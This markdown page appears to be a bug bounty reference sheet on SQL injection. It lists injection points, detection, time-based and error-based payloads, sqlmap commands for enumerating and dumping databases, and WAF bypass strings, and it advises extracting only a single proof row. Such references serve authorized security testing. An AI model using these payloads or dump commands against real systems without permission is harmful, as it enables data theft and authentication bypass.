---
title: "SQL Injection"
---

## What It Is

SQLi lets you manipulate database queries by injecting SQL syntax through user input. Can lead to data exfiltration, authentication bypass, and sometimes RCE.

## Where to Look

- Login forms (username/password fields)
- Search functionality
- URL parameters used in data lookups (`?id=1`, `?category=shoes`)
- Sorting / ordering parameters (`?sort=name&order=asc`)
- API filters and query parameters
- Cookie values used in server-side queries
- HTTP headers (X-Forwarded-For, Referer) used in logging

## Testing

```bash
# Basic detection — watch for errors or behavior changes
'
"
' OR '1'='1
' OR '1'='1'--
" OR "1"="1"--
1' AND '1'='1
1' AND '1'='2
' UNION SELECT NULL--

# Time-based blind
' AND SLEEP(5)--          # MySQL
'; WAITFOR DELAY '0:0:5'-- # MSSQL
' AND pg_sleep(5)--        # PostgreSQL

# Error-based
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```

## SQLMap

```bash
# Basic
sqlmap -u "https://<TARGET>/page?id=1" --batch

# With cookies / auth
sqlmap -u "https://<TARGET>/page?id=1" --cookie="session=<COOKIE>" --batch

# POST data
sqlmap -u "https://<TARGET>/login" --data="user=admin&pass=test" --batch

# From Burp request file
sqlmap -r request.txt --batch

# Enumerate
sqlmap -u "https://<TARGET>/page?id=1" --dbs
sqlmap -u "https://<TARGET>/page?id=1" -D <DB> --tables
sqlmap -u "https://<TARGET>/page?id=1" -D <DB> -T <TABLE> --dump

# Specific techniques
sqlmap -u "https://<TARGET>/page?id=1" --technique=T --time-sec=5  # time-based only
```

## Filter Bypasses

```sql
-- Space bypass
'/**/OR/**/1=1--
'+OR+1=1--
'%09OR%091=1--

-- Keyword bypass
'UNION%0ASELECT%0A1,2,3--
'uNiOn SeLeCt 1,2,3--

-- Comment bypass
'UNION/*!SELECT*/1,2,3--

-- WAF bypass
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

## Proving Impact

For bug bounty, you typically need to show you can extract data. Don't dump entire databases — extract a single proof row:

```sql
-- Show current user
' UNION SELECT user(),2,3--

-- Show a table name
' UNION SELECT table_name,2,3 FROM information_schema.tables LIMIT 1--

-- Show database version
' UNION SELECT version(),2,3--
```

> Stop as soon as you have proof. Don't access real user data.

## Findings

| Endpoint | Parameter | Type | Impact | Status |
|----------|-----------|------|--------|--------|
| | | | | |
